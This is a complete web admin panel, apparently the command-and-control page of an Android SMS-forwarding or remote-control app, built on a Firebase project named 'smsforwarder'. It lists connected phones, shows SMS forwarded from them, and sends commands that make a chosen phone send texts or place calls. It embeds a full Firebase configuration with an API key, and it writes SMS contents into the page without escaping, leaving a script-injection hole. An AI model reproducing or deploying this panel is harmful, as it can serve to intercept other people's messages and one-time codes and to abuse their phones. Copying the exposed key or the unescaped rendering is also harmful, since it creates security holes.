<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Remote Control Admin Panel</title>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0a0f;
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 30px;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            border-radius: 16px;
            margin-bottom: 25px;
            border: 1px solid #2a2a4a;
        }

        .header h1 {
            font-size: 24px;
            background: linear-gradient(90deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header .status-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 16px;
            background: #1a1a2e;
            border-radius: 20px;
            border: 1px solid #2a2a4a;
            font-size: 14px;
        }

        .status-badge .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
        }

        .dot.online {
            background: #4ade80;
            box-shadow: 0 0 10px #4ade8050;
        }

        .dot.offline {
            background: #f87171;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 25px;
        }

        .stat-card {
            background: #12121f;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #1e1e35;
        }

        .stat-card .number {
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
        }

        .stat-card .label {
            font-size: 13px;
            color: #888;
            margin-top: 4px;
        }

        /* Main Grid */
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }

        @media (max-width: 900px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Cards */
        .card {
            background: #12121f;
            border-radius: 16px;
            padding: 24px;
            border: 1px solid #1e1e35;
        }

        .card h3 {
            font-size: 16px;
            color: #aaa;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .card h3 i {
            color: #667eea;
        }

        /* Form Elements */
        input,
        select,
        textarea {
            width: 100%;
            padding: 12px 14px;
            margin-bottom: 12px;
            background: #1a1a2e;
            border: 1px solid #2a2a4a;
            border-radius: 10px;
            color: #fff;
            font-size: 14px;
            transition: 0.3s;
        }

        input:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px #667eea30;
        }

        textarea {
            resize: vertical;
            min-height: 70px;
        }

        select option {
            background: #1a1a2e;
        }

        /* Buttons */
        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px #667eea40;
        }

        .btn-success {
            background: #22c55e;
            color: #fff;
        }

        .btn-success:hover {
            background: #16a34a;
            transform: translateY(-2px);
        }

        .btn-danger {
            background: #ef4444;
            color: #fff;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .btn-outline {
            background: transparent;
            border: 1px solid #2a2a4a;
            color: #aaa;
        }

        .btn-outline:hover {
            border-color: #667eea;
            color: #fff;
        }

        .btn-sm {
            padding: 6px 12px;
            font-size: 12px;
        }

        /* Device List */
        .device-list {
            max-height: 250px;
            overflow-y: auto;
        }

        .device-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            background: #1a1a2e;
            border-radius: 10px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: 0.3s;
            border: 1px solid transparent;
        }

        .device-item:hover {
            border-color: #2a2a4a;
        }

        .device-item.selected {
            border-color: #667eea;
            background: #1a1a3e;
        }

        .device-item .info .name {
            font-size: 14px;
        }

        .device-item .info .id {
            font-size: 11px;
            color: #666;
        }

        .device-item .status-badge {
            font-size: 12px;
            padding: 4px 12px;
            border-radius: 20px;
        }

        .device-item .status-badge.online {
            background: #22c55e20;
            color: #4ade80;
        }

        .device-item .status-badge.offline {
            background: #ef444420;
            color: #f87171;
        }

        /* Messages List */
        .messages-list {
            max-height: 300px;
            overflow-y: auto;
        }

        .message-item {
            padding: 12px 16px;
            background: #1a1a2e;
            border-radius: 10px;
            margin-bottom: 8px;
            border-left: 3px solid #667eea;
        }

        .message-item .from {
            font-weight: 600;
            color: #667eea;
            font-size: 14px;
        }

        .message-item .text {
            color: #ccc;
            font-size: 13px;
            margin-top: 4px;
        }

        .message-item .time {
            color: #666;
            font-size: 11px;
            margin-top: 4px;
        }

        /* Response Log */
        .response-log {
            background: #0a0a12;
            border-radius: 10px;
            padding: 12px;
            max-height: 120px;
            overflow-y: auto;
            font-size: 12px;
            color: #888;
            margin-top: 12px;
            font-family: monospace;
        }

        .response-log .log-entry {
            padding: 4px 0;
            border-bottom: 1px solid #1a1a2e;
        }

        .response-log .log-entry .time {
            color: #555;
        }

        .response-log .log-entry.success {
            color: #4ade80;
        }

        .response-log .log-entry.error {
            color: #f87171;
        }

        /* Loading */
        .loading {
            text-align: center;
            padding: 30px;
            color: #666;
        }

        .loading i {
            font-size: 24px;
            margin-bottom: 10px;
            display: block;
        }

        .empty {
            text-align: center;
            padding: 30px;
            color: #444;
        }

        .empty i {
            font-size: 30px;
            display: block;
            margin-bottom: 10px;
        }

        /* Responsive tweaks */
        .flex-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .flex-row .btn {
            flex: 1;
            justify-content: center;
        }

        .mt-12 {
            margin-top: 12px;
        }

        .mb-12 {
            margin-bottom: 12px;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><i class="fas fa-satellite-dish"></i> Remote Control Admin</h1>
            <div class="status-badge">
                <span class="dot online" id="statusDot"></span>
                <span id="statusText">Connected</span>
                <span style="color:#555;margin-left:8px;" id="deviceCount">0 devices</span>
            </div>
        </div>

        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="number" id="totalDevices">0</div>
                <div class="label">Total Devices</div>
            </div>
            <div class="stat-card">
                <div class="number" id="onlineDevices">0</div>
                <div class="label">Online Now</div>
            </div>
            <div class="stat-card">
                <div class="number" id="totalSms">0</div>
                <div class="label">SMS Received</div>
            </div>
            <div class="stat-card">
                <div class="number" id="commandsSent">0</div>
                <div class="label">Commands Sent</div>
            </div>
        </div>

        <!-- Main Controls -->
        <div class="main-grid">
            <!-- Send SMS -->
            <div class="card">
                <h3><i class="fas fa-envelope"></i> Send Remote SMS</h3>
                <select id="deviceSelectSms">
                    <option value="">Select a device...</option>
                </select>
                <input type="tel" id="smsNumber" placeholder="Phone number (e.g., +91xxxxxxxxxx)" />
                <textarea id="smsMessage" placeholder="Type your message..."></textarea>
                <button class="btn btn-success" onclick="sendRemoteSms()">
                    <i class="fas fa-paper-plane"></i> Send SMS
                </button>
                <div id="smsResponse" class="response-log" style="display:none;"></div>
            </div>

            <!-- Make Call -->
            <div class="card">
                <h3><i class="fas fa-phone"></i> Make Remote Call</h3>
                <select id="deviceSelectCall">
                    <option value="">Select a device...</option>
                </select>
                <input type="tel" id="callNumber" placeholder="Phone number (e.g., +91xxxxxxxxxx)" />
                <button class="btn btn-primary" onclick="makeRemoteCall()">
                    <i class="fas fa-phone-alt"></i> Make Call
                </button>
                <div id="callResponse" class="response-log" style="display:none;"></div>
            </div>
        </div>

        <!-- Device List & Messages -->
        <div class="main-grid">
            <!-- Devices -->
            <div class="card">
                <h3><i class="fas fa-mobile-alt"></i> Connected Devices</h3>
                <div class="flex-row mb-12">
                    <button class="btn btn-outline btn-sm" onclick="loadDevices()">
                        <i class="fas fa-sync"></i> Refresh
                    </button>
                </div>
                <div id="devicesList" class="device-list">
                    <div class="loading"><i class="fas fa-spinner fa-spin"></i> Loading devices...</div>
                </div>
                <div id="selectedDeviceInfo" class="response-log" style="display:none;"></div>
            </div>

            <!-- Messages -->
            <div class="card">
                <h3><i class="fas fa-inbox"></i> Incoming SMS</h3>
                <div class="flex-row mb-12">
                    <button class="btn btn-outline btn-sm" onclick="loadMessages()">
                        <i class="fas fa-sync"></i> Refresh
                    </button>
                </div>
                <div id="messagesList" class="messages-list">
                    <div class="loading"><i class="fas fa-spinner fa-spin"></i> Loading messages...</div>
                </div>
            </div>
        </div>

        <!-- Command Log -->
        <div class="card">
            <h3><i class="fas fa-list-ul"></i> Command Log</h3>
            <div id="commandLog" class="response-log">
                <div class="log-entry"><span class="time">[System]</span> Admin panel ready</div>
            </div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js">
    </script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js">
    </script>

    <script>
        // 🔥 YOUR FIREBASE CONFIG - REPLACE WITH YOUR VALUES 🔥
    const firebaseConfig = {
    apiKey: "AIzaSyC8HTIJc939xRkh6p-IUDT9_RovCeXmuw0",
    authDomain: "smsforwarder-ea5be.firebaseapp.com",
    databaseURL: "https://smsforwarder-ea5be-default-rtdb.firebaseio.com",
    projectId: "smsforwarder-ea5be",
    storageBucket: "smsforwarder-ea5be.firebasestorage.app",
    messagingSenderId: "473317673810",
    appId: "1:473317673810:android:9a3c90dcf45dd00aa6888b"
    };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // State
        let selectedDeviceId = null;
        let commandCount = 0;

        // ============================================
        // LOAD FUNCTIONS
        // ============================================

        function loadDevices() {
            const listEl = document.getElementById('devicesList');
            const selectSms = document.getElementById('deviceSelectSms');
            const selectCall = document.getElementById('deviceSelectCall');

            database.ref('users').once('value', (snapshot) => {
                const devices = [];
                let onlineCount = 0;

                snapshot.forEach((child) => {
                    const deviceId = child.key;
                    const status = child.child('status').val();
                    const isOnline = status && status.online && (Date.now() - status.lastSeen) <
                    60000;
                    if (isOnline) onlineCount++;
                    devices.push({ id: deviceId, online: isOnline, lastSeen: status?.lastSeen ||
                            0 });
                });

                // Update stats
                document.getElementById('totalDevices').textContent = devices.length;
                document.getElementById('onlineDevices').textContent = onlineCount;

                // Update dropdowns
                selectSms.innerHTML = '<option value="">Select device...</option>';
                selectCall.innerHTML = '<option value="">Select device...</option>';

                // Render device list
                if (devices.length === 0) {
                    listEl.innerHTML = `<div class="empty"><i class="fas fa-wifi"></i>No devices connected</div>`;
                    return;
                }

                let html = '';
                devices.forEach((device) => {
                    const statusClass = device.online ? 'online' : 'offline';
                    const statusText = device.online ? '🟢 Online' : '🔴 Offline';
                    const lastSeen = device.lastSeen ? new Date(device.lastSeen).toLocaleString() :
                        'Never';

                    html += `
                            <div class="device-item ${selectedDeviceId === device.id ? 'selected' : ''}" 
                                 onclick="selectDevice('${device.id}')">
                                <div class="info">
                                    <div class="name">📱 ${device.id.substring(0, 12)}...</div>
                                    <div class="id">Last seen: ${lastSeen}</div>
                                </div>
                                <span class="status-badge ${statusClass}">${statusText}</span>
                            </div>
                        `;

                    // Add to dropdowns
                    const optionSms = document.createElement('option');
                    optionSms.value = device.id;
                    optionSms.textContent = `${device.id.substring(0, 12)}... ${device.online ? '🟢 Online' : '🔴 Offline'}`;
                    selectSms.appendChild(optionSms);

                    const optionCall = document.createElement('option');
                    optionCall.value = device.id;
                    optionCall.textContent = `${device.id.substring(0, 12)}... ${device.online ? '🟢 Online' : '🔴 Offline'}`;
                    selectCall.appendChild(optionCall);
                });

                listEl.innerHTML = html;
            });
        }

        function loadMessages() {
            const listEl = document.getElementById('messagesList');

            database.ref('admin/incoming_sms').limitToLast(20).once('value', (snapshot) => {
                const messages = [];
                snapshot.forEach((child) => {
                    const sms = child.val();
                    sms.id = child.key;
                    messages.unshift(sms);
                });

                document.getElementById('totalSms').textContent = messages.length;

                if (messages.length === 0) {
                    listEl.innerHTML = `<div class="empty"><i class="fas fa-envelope"></i>No messages received yet</div>`;
                    return;
                }

                let html = '';
                messages.forEach((sms) => {
                    const time = new Date(sms.timestamp).toLocaleString();
                    html += `
                            <div class="message-item">
                                <div class="from">📱 ${sms.from || 'Unknown'}</div>
                                <div class="text">${sms.message || 'No message'}</div>
                                <div class="time">🕐 ${time}</div>
                            </div>
                        `;
                });

                listEl.innerHTML = html;
            });
        }

        // ============================================
        // DEVICE SELECTION
        // ============================================

        function selectDevice(deviceId) {
            selectedDeviceId = deviceId;
            loadDevices(); // Refresh to show selection

            // Show device info
            const infoEl = document.getElementById('selectedDeviceInfo');
            infoEl.style.display = 'block';

            database.ref(`users/${deviceId}/status`).once('value', (snapshot) => {
                const status = snapshot.val();
                if (status) {
                    infoEl.innerHTML = `
                            <strong>Selected Device:</strong><br>
                            ID: ${deviceId}<br>
                            Status: ${status.online ? '🟢 Online' : '🔴 Offline'}<br>
                            Last seen: ${new Date(status.lastSeen).toLocaleString()}
                        `;
                }
            });

            addLog(`📱 Selected device: ${deviceId.substring(0, 12)}...`);
        }

        // ============================================
        // REMOTE COMMANDS
        // ============================================

function sendRemoteSms() {
    const deviceSelect = document.getElementById('deviceSelectSms');
    const deviceId = deviceSelect.value;
    const phoneNumber = document.getElementById('smsNumber').value.trim();
    const message = document.getElementById('smsMessage').value.trim();

    if (!deviceId) {
        showResponse('smsResponse', '❌ Please select a device', 'error');
        return;
    }

    if (!phoneNumber) {
        showResponse('smsResponse', '❌ Please enter a phone number', 'error');
        return;
    }

    if (!message) {
        showResponse('smsResponse', '❌ Please enter a message', 'error');
        return;
    }

    // Send command
    const commandRef = database.ref(`admin_commands/${deviceId}`).push();
    commandRef.set({
        command: 'send_sms',
        data: `${phoneNumber}|${message}`,
        timestamp: Date.now()
    }).then(() => {
        commandCount++;
        document.getElementById('commandsSent').textContent = commandCount;
        addLog(`📤 SMS sent to ${phoneNumber} via ${deviceId.substring(0, 12)}...`);
        showResponse('smsResponse', `✅ SMS command sent to ${phoneNumber}`, 'success');
        document.getElementById('smsMessage').value = '';
        document.getElementById('smsNumber').value = '';
    }).catch((error) => {
        showResponse('smsResponse', `❌ Error: ${error.message}`, 'error');
    });
}

        function makeRemoteCall() {
            const deviceSelect = document.getElementById('deviceSelectCall');
            const deviceId = deviceSelect.value;
            const phoneNumber = document.getElementById('callNumber').value.trim();

            if (!deviceId) {
                showResponse('callResponse', '❌ Please select a device', 'error');
                return;
            }

            if (!phoneNumber) {
                showResponse('callResponse', '❌ Please enter a phone number', 'error');
                return;
            }

            const commandRef = database.ref(`admin_commands/${deviceId}`).push();
            commandRef.set({
                command: 'make_call',
                data: phoneNumber,
                timestamp: Date.now()
            }).then(() => {
                commandCount++;
                document.getElementById('commandsSent').textContent = commandCount;
                addLog(`📞 Call initiated to ${phoneNumber} via ${deviceId.substring(0, 12)}...`);
                showResponse('callResponse', `✅ Call command sent to ${phoneNumber}`, 'success');
                document.getElementById('callNumber').value = '';
            }).catch((error) => {
                showResponse('callResponse', `❌ Error: ${error.message}`, 'error');
            });
        }

        // ============================================
        // RESPONSE / LOG HELPERS
        // ============================================

        function showResponse(elementId, message, type) {
            const el = document.getElementById(elementId);
            el.style.display = 'block';
            el.className = 'response-log';
            el.innerHTML = `<div class="log-entry ${type}">${message}</div>`;
            setTimeout(() => {
                el.style.display = 'none';
            }, 5000);
        }

        function addLog(message) {
            const logEl = document.getElementById('commandLog');
            const time = new Date().toLocaleTimeString();
            logEl.innerHTML = `<div class="log-entry"><span class="time">[${time}]</span> ${message}</div>` + logEl
                .innerHTML;
            // Keep last 20
            const entries = logEl.innerHTML.split('</div>');
            if (entries.length > 20) {
                logEl.innerHTML = entries.slice(0, 20).join('</div>') + '</div>';
            }
        }

        // ============================================
        // REAL-TIME LISTENERS
        // ============================================

        // Listen for incoming SMS (auto-update)
        database.ref('admin/incoming_sms').limitToLast(1).on('child_added', (snapshot) => {
            const sms = snapshot.val();
            if (sms) {
                document.getElementById('totalSms').textContent = parseInt(document.getElementById('totalSms')
                    .textContent) + 1;
                addLog(`📨 New SMS from ${sms.from}`);
                // Reload messages to show new one
                loadMessages();
            }
        });

        // Listen for command responses
        database.ref('admin_responses').on('child_added', (snapshot) => {
            snapshot.forEach((responseSnapshot) => {
                const response = responseSnapshot.val();
                if (response) {
                    addLog(`📨 Response: ${response.type} - ${response.message || 'OK'}`);
                }
            });
        });

        // ============================================
        // AUTO REFRESH
        // ============================================

        // Refresh devices every 15 seconds
        setInterval(loadDevices, 15000);
        // Refresh messages every 30 seconds
        setInterval(loadMessages, 30000);

        // ============================================
        // INIT
        // ============================================

        console.log('🌐 Admin Panel Ready');
        loadDevices();
        loadMessages();
    </script>

</body>
</html>
